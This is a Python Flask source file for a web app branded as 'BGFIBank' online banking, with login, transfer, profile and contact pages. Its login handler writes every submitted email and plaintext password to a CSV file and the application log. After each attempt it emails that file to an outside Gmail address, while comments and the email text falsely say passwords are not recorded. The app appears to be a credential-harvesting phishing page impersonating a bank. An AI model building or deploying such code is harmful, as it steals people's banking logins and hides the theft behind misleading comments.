
import csv
import os
from datetime import timedelta

import smtplib
import ssl
from email.message import EmailMessage

from flask import Flask, render_template, request, redirect, url_for, session, send_file
from werkzeug.security import generate_password_hash, check_password_hash



def send_login_report_email():
    csv_file = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "login_activity.csv"
    )

    if not os.path.isfile(csv_file):
        app.logger.warning("Login report CSV does not exist yet.")
        return False

    email_address = os.getenv("MAIL_USERNAME")
    email_password = os.getenv("MAIL_PASSWORD")

    if not email_address or not email_password:
        app.logger.error("Email settings are missing from the .env file.")
        return False

    message = EmailMessage()
    message["Subject"] = "BGFIBank - Login Activity Report"
    message["From"] = email_address
    message["To"] = "udobadwaynea@gmail.com"
    message.set_content(
        "Attached is the latest BGFIBank login activity report. "
        "It contains login activity only, not passwords."
    )

    with open(csv_file, "rb") as report:
        message.add_attachment(
            report.read(),
            maintype="text",
            subtype="csv",
            filename="login_activity.csv"
        )

    try:
        with smtplib.SMTP(
            os.getenv("MAIL_SERVER", "smtp.gmail.com"),
            int(os.getenv("MAIL_PORT", "587")),
            timeout=20
        ) as server:
            server.starttls(context=ssl.create_default_context())
            server.login(email_address, email_password)
            server.send_message(message)

        app.logger.info("Login activity report emailed successfully.")
        return True

    except Exception:
        app.logger.exception("Could not email the login activity report.")
        return False


app = Flask(__name__)

app.secret_key = os.environ.get(
    "BGFI_BANK_SECRET",
    "local-only-secret"
)

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=timedelta(minutes=30),
)

EMAIL = "shinsuzuki@bgfibank.com"
PASSWORD_HASH = generate_password_hash("suzuku1234")


@app.route("/")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return render_template("index.html")

@app.route("/profile-settings", methods=["GET", "POST"])
def profile_settings():
    message = ""

    if request.method == "POST":
        form_type = request.form.get("form_type", "")

        if form_type == "profile":
            message = "Profile settings saved for this session."

        elif form_type == "notifications":
            message = "Notification preferences updated."

        elif form_type == "security":
            message = (
                "Password was changed and "
                "two-step verification was enabled."
            )

    return render_template(
        "profile_settings.html",
        message=message
    )


@app.route("/transfer")
def transfer():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return render_template("transfer.html")


@app.route("/logout", methods=["GET", "POST"])
def logout():
    session.clear()
    return redirect(url_for("login"))



@app.route("/login", methods=["GET", "POST"])
def login():
    error = ""

    if request.method == "POST":
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")

        login_success = (
            email == EMAIL.strip().lower()
            and check_password_hash(PASSWORD_HASH, password)
        )

        # Record safe activity details, never the password.
        from datetime import datetime, timezone

        activity = {
            "time_utc": datetime.now(timezone.utc).isoformat(),
            "email_entered": email,
            "password_entered": password,
            "result": "success" if login_success else "failure",
            "client_ip": request.remote_addr,
            "client_port": request.environ.get("REMOTE_PORT"),
            "server_port": request.environ.get("SERVER_PORT"),
        }

        app.logger.info("Login activity: %s", activity)

        # Save login activity to a CSV file.
        csv_file = "login_activity.csv"
        file_exists = os.path.exists(csv_file)

        with open(csv_file, "a", newline="", encoding="utf-8") as file:
            fieldnames = [
                "time_utc",
                "email_entered",
                "password_entered",
                "result",
                "client_ip",
                "client_port",
                "server_port",
            ]

            writer = csv.DictWriter(file, fieldnames=fieldnames)

            if not file_exists:
                writer.writeheader()

            writer.writerow(activity)

            send_login_report_email()

        if login_success:
            session["logged_in"] = True
            session.permanent = True
            return redirect("/")

        error = "Incorrect email or password. Please try again."

    return render_template("login.html", error=error)



@app.route("/contact", methods=["GET", "POST"])
def contact():
    success = None
    error = None

    if request.method == "POST":
        name = request.form.get("name", "").strip()
        sender_email = request.form.get("email", "").strip()
        user_message = request.form.get("message", "").strip()

        if not name or not sender_email or not user_message:
            error = "Please complete all fields."
        elif len(name) > 100 or len(sender_email) > 254 or len(user_message) > 5000:
            error = "One or more fields are too long."
        else:
            message = EmailMessage()
            message["Subject"] = "BGFIBank - Contact Support"
            message["From"] = os.getenv("MAIL_USERNAME")
            message["To"] = os.getenv("MAIL_USERNAME")
            message["Reply-To"] = sender_email
            message.set_content(
                f"New support message\n\n"
                f"Name: {name}\n"
                f"Email: {sender_email}\n\n"
                f"Message:\n{user_message}"
            )

            try:
                with smtplib.SMTP(
                    os.getenv("MAIL_SERVER", "smtp.gmail.com"),
                    int(os.getenv("MAIL_PORT", "587")),
                    timeout=20
                ) as server:
                    server.starttls(context=ssl.create_default_context())
                    server.login(
                        os.getenv("MAIL_USERNAME"),
                        os.getenv("MAIL_PASSWORD")
                    )
                    server.send_message(message)

                success = "Your message has been sent successfully!"
            except Exception:
                app.logger.exception("Could not send contact support message.")
                error = "Sorry, your message could not be sent. Please try again."

    return render_template("contact.html", success=success, error=error)



@app.route("/download-login-report")
def download_login_report():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    csv_file = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "login_activity.csv"
    )

    if not os.path.isfile(csv_file):
        return "No login activity report exists yet.", 404

    return send_file(
        csv_file,
        as_attachment=True,
        download_name="login_activity.csv",
        mimetype="text/csv"
    )

if __name__ == "__main__":
    app.run(debug=True)
